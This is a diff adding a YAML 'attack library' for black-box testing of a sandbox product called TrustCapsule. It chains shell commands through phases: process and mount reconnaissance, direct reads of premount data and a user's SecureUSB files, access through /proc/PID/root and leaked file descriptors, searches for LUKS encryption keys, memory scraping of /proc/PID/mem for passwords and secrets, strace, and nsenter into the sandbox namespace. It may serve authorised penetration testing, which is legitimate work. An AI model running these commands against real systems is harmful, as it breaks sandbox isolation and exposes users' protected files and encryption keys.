@@ -1,0 +1,213 @@
+# attacks/attack_library.yaml
+
+name: "TrustCapsule Black-Box Attack"
+version: "1.0"
+
+attacks:
+  # ============ PHASE 1: RECON ============
+  - id: "recon_process"
+    phase: "recon"
+    priority: 1
+    description: "Identify sandbox processes (bwrap, Xephyr, init.sh)"
+    commands:
+      - "pgrep -a bwrap"
+      - "pgrep -a Xephyr"
+      - "pgrep -f 'init.sh' | head -5"
+      - "ps aux | grep -E 'bwrap|Xephyr|xfce' | grep -v grep"
+    success_indicators:
+      - "bwrap"
+    fail_indicators:
+      - "No such process"
+    next_phase: "recon_mount"
+    tags:
+      - "process"
+      - "safe"
+
+  - id: "recon_mount"
+    phase: "recon"
+    priority: 2
+    description: "Locate premount directories and temp work directories"
+    commands:
+      - "ls -la /tmp/tc_data_premount.* 2>/dev/null"
+      - "ls -la /tmp/tc_work.* 2>/dev/null"
+      - "ls -la /tmp/tc_work.*/ | head -30"
+      - "mount | grep -E 'tc_|premount|data'"
+    success_indicators:
+      - "tc_data_premount"
+      - "tc_work"
+    fail_indicators:
+      - "No such file"
+    next_phase: "direct_read"
+    tags:
+      - "filesystem"
+      - "safe"
+
+  - id: "recon_kernel"
+    phase: "recon"
+    priority: 3
+    description: "Check kernel version for known CVEs"
+    commands:
+      - "uname -a"
+      - "cat /proc/version"
+      - "cat /proc/sys/kernel/yama/ptrace_scope"
+    success_indicators:
+      - "5.4"
+    next_phase: "direct_read"
+    tags:
+      - "kernel"
+      - "safe"
+
+  # ============ PHASE 2: DIRECT READ ============
+  - id: "direct_read_premount"
+    phase: "direct_read"
+    priority: 10
+    description: "Read data partition files directly from premount directory"
+    commands:
+      - "find /tmp/tc_data_premount.* -type f 2>/dev/null | head -30"
+      - "ls -laR /tmp/tc_data_premount.*/ 2>/dev/null"
+    success_indicators:
+      - "file"
+    fail_indicators:
+      - "No such file"
+    next_phase: "direct_read_content"
+    tags:
+      - "filesystem"
+      - "high_impact"
+
+  - id: "direct_read_content"
+    phase: "direct_read"
+    priority: 11
+    description: "Read actual file contents from premount"
+    commands:
+      - "head -c 2048 /tmp/tc_data_premount.*/home/chengzipi/* 2>/dev/null"
+      - "head -c 2048 /tmp/tc_data_premount.*/home/sandbox/SecureUSB/* 2>/dev/null"
+      - "file /tmp/tc_data_premount.*/home/sandbox/SecureUSB/* 2>/dev/null"
+    success_indicators:
+      - "text"
+      - "UTF-8"
+      - "PDF"
+    fail_indicators:
+      - "No such file"
+      - "Permission denied"
+    next_phase: "proc_access"
+    tags:
+      - "data_extraction"
+      - "critical"
+
+  # ============ PHASE 3: PROC ACCESS ============
+  - id: "proc_access"
+    phase: "proc_access"
+    priority: 20
+    description: "Read sandbox files via /proc/PID/root"
+    commands:
+      - "CONTAINER_PID=$(pgrep -f 'bash.*init.sh' | head -1); echo PID=$CONTAINER_PID"
+      - "CONTAINER_PID=$(pgrep -f 'bash.*init.sh' | head -1); ls -la /proc/$CONTAINER_PID/root/ 2>/dev/null"
+      - "CONTAINER_PID=$(pgrep -f 'bash.*init.sh' | head -1); ls -la /proc/$CONTAINER_PID/root/home/sandbox/ 2>/dev/null"
+      - "CONTAINER_PID=$(pgrep -f 'bash.*init.sh' | head -1); cat /proc/$CONTAINER_PID/root/home/sandbox/SecureUSB/* 2>/dev/null | head -200"
+    success_indicators:
+      - "SecureUSB"
+    fail_indicators:
+      - "No such process"
+      - "Permission denied"
+    next_phase: "proc_fd"
+    tags:
+      - "proc"
+      - "high_impact"
+
+  - id: "proc_fd"
+    phase: "proc_access"
+    priority: 21
+    description: "Check file descriptor leaks from sandbox processes"
+    commands:
+      - "CONTAINER_PID=$(pgrep -f 'bash.*init.sh' | head -1); ls -la /proc/$CONTAINER_PID/fd/ 2>/dev/null"
+      - "CONTAINER_PID=$(pgrep -f 'bash.*init.sh' | head -1); readlink /proc/$CONTAINER_PID/fd/* 2>/dev/null"
+      - "BWRAP_PID=$(pgrep -f bwrap | head -1); readlink /proc/$BWRAP_PID/fd/* 2>/dev/null | grep -vE '/dev/|pipe:|socket:'"
+    success_indicators:
+      - "/proc"
+      - "/home"
+      - "/etc"
+    fail_indicators:
+      - "No such process"
+    next_phase: "encryption_check"
+    tags:
+      - "fd_leak"
+      - "CVE-2024-21626"
+
+  # ============ PHASE 4: ENCRYPTION CHECK ============
+  - id: "encryption_check"
+    phase: "encryption_check"
+    priority: 30
+    description: "Check if data is encrypted, find encryption keys"
+    commands:
+      - "dmsetup ls --target crypt 2>/dev/null"
+      - "dmsetup status 2>/dev/null"
+      - "find /tmp/tc_work.* -type f 2>/dev/null"
+      - "cat /tmp/tc_work.*/*.json 2>/dev/null"
+      - "find /tmp/tc_work.* -name '*key*' -o -name '*crypt*' -o -name '*secret*' 2>/dev/null"
+      - "cryptsetup isLuks /dev/sda6 2>/dev/null && echo LUKS_ENCRYPTED || echo NOT_LUKS"
+      - "blkid /dev/sda6 2>/dev/null"
+    success_indicators:
+      - "crypt"
+      - "LUKS"
+    fail_indicators:
+      - "NOT_LUKS"
+    next_phase: "memory_dump"
+    tags:
+      - "encryption"
+      - "critical"
+
+  # ============ PHASE 5: MEMORY DUMP ============
+  - id: "memory_dump"
+    phase: "memory_dump"
+    priority: 40
+    description: "Dump process memory to find encryption keys or sensitive data"
+    commands:
+      - "cat /proc/sys/kernel/yama/ptrace_scope"
+      - "BWRAP_PID=$(pgrep -f bwrap | head -1); echo BWRAP_PID=$BWRAP_PID"
+      - "BWRAP_PID=$(pgrep -f bwrap | head -1); cat /proc/$BWRAP_PID/maps 2>/dev/null | head -20"
+      - "BWRAP_PID=$(pgrep -f bwrap | head -1); strings /proc/$BWRAP_PID/mem 2>/dev/null | grep -iE 'key|crypt|sm4|password|secret' | head -20"
+    success_indicators:
+      - "rw-p"
+      - "key"
+    fail_indicators:
+      - "Operation not permitted"
+    next_phase: "strace_monitor"
+    tags:
+      - "memory"
+      - "advanced"
+
+  # ============ PHASE 6: STRACE ============
+  - id: "strace_monitor"
+    phase: "strace"
+    priority: 50
+    description: "Trace sandbox syscalls to find file access patterns"
+    commands:
+      - "CONTAINER_PID=$(pgrep -f 'bash.*init.sh' | head -1); timeout 10 strace -p $CONTAINER_PID -e trace=open,openat,read,write 2>&1 | head -50"
+    success_indicators:
+      - "openat"
+      - "/home/sandbox"
+    fail_indicators:
+      - "Operation not permitted"
+      - "No such process"
+    next_phase: "report"
+    tags:
+      - "syscall"
+      - "advanced"
+
+  # ============ PHASE 7: NSENTER ============
+  - id: "nsenter_access"
+    phase: "nsenter"
+    priority: 60
+    description: "Enter sandbox namespace via nsenter"
+    commands:
+      - "BWRAP_PID=$(pgrep -f bwrap | head -1); nsenter -t $BWRAP_PID -m -u -i -n -p -- ls / 2>/dev/null"
+      - "BWRAP_PID=$(pgrep -f bwrap | head -1); nsenter -t $BWRAP_PID -m -- cat /etc/passwd 2>/dev/null"
+    success_indicators:
+      - "sandbox"
+    fail_indicators:
+      - "nsenter failed"
+      - "No such process"
+    next_phase: "report"
+    tags:
+      - "namespace"
+      - "high_impact"
